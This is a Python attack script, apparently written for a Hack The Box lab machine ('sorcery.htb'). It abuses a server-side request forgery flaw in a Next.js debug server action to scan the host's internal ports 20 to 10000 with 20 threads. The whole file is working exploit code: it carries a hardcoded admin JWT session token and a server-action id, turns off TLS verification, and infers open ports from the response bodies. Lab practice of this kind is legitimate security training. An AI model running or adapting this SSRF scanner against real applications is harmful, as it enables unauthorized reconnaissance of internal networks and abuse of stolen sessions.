#!/usr/bin/env python3
import requests
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import json

class SSRFScanner:
    def __init__(self, token, next_action, target="sorcery.htb"):
        self.base_url = f"https://{target}"
        self.endpoint = "/dashboard/debug"
        self.headers = {
            "Host": target,
            "Cookie": f"token={token}",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
            "Accept": "text/x-component",
            "Accept-Language": "en-US,en;q=0.5",
            "Referer": f"https://{target}/dashboard/debug",
            "Next-Action": next_action,
            "Next-Router-State-Tree": "%5B%22%22%2C%7B%22children%22%3A%5B%22dashboard%22%2C%7B%22children%22%3A%5B%22debug%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2Fdashboard%2Fdebug%22%2C%22refresh%22%5D%7D%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
            "Content-Type": "text/plain;charset=UTF-8",
            "Origin": f"https://{target}",
            "Connection": "keep-alive"
        }

    def is_port_open(self, response_text):
        if '"error":{"error":"Not found"}' in response_text:
            return False
        if response_text.strip() == "":
            return False
        return True

    def test_port_simple(self, port):
        try:
            payload = f'["127.0.0.1",{port},[],true,false]'
            r = requests.post(
                f"{self.base_url}{self.endpoint}",
                headers=self.headers,
                data=payload,
                timeout=(2, 2),  # Fixed to prevent read hangs
                verify=False
            )
            return self.is_port_open(r.text)
        except:
            return False

    def scan_range(self, start_port, end_port):
        open_ports = []
        print(f"[*] Starting scan on {self.base_url} from port {start_port} to {end_port}...")
        
        ex = ThreadPoolExecutor(max_workers=20)
        futures = {ex.submit(self.test_port_simple, p): p for p in range(start_port, end_port + 1)}
        
        try:
            for future in as_completed(futures):
                port = futures[future]
                try:
                    if future.result():
                        print(f"[+] Port {port} is open")
                        open_ports.append(port)
                except Exception:
                    pass
                    
        except KeyboardInterrupt:
            print("\n[!] Ctrl+C detected. Cancelling pending tasks...")
            for future in futures:
                future.cancel()
            ex.shutdown(wait=False, cancel_futures=True)
            print("[!] Shutdown complete. Exiting.")
            sys.exit(0)
            
        ex.shutdown(wait=True)
        return sorted(open_ports)


def main():
    # Hardcoded values for quick execution
    TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjJkOWYwZDllLTA5MzUtNDlmMy1hZmNkLTI5YWJkMzQyNzAxMSIsInVzZXJuYW1lIjoiYWRtaW4iLCJwcml2aWxlZ2VMZXZlbCI6Miwid2l0aFBhc3NrZXkiOnRydWUsIm9ubHlGb3JQYXRocyI6bnVsbCwiZXhwIjoxNzczNzY0ODg5fQ.b8RwYFnsY8wEBTJFdXymBJhuR6TpbcMFimwXc4UUo6Q"
    NEXT_ACTION = "99cc053db6c8902cbccf05efda80ea0306624c56"
    
    # Disable insecure request warnings for HTTPS
    requests.packages.urllib3.disable_warnings()

    scanner = SSRFScanner(TOKEN, NEXT_ACTION)
    
    # Run the scan and store the returned array
    results = scanner.scan_range(20, 10000)
    
    # Print final summary
    print("\n[*] Scan Finished!")
    print(f"[*] Open Ports Found: {results}")

if __name__ == "__main__":
    main()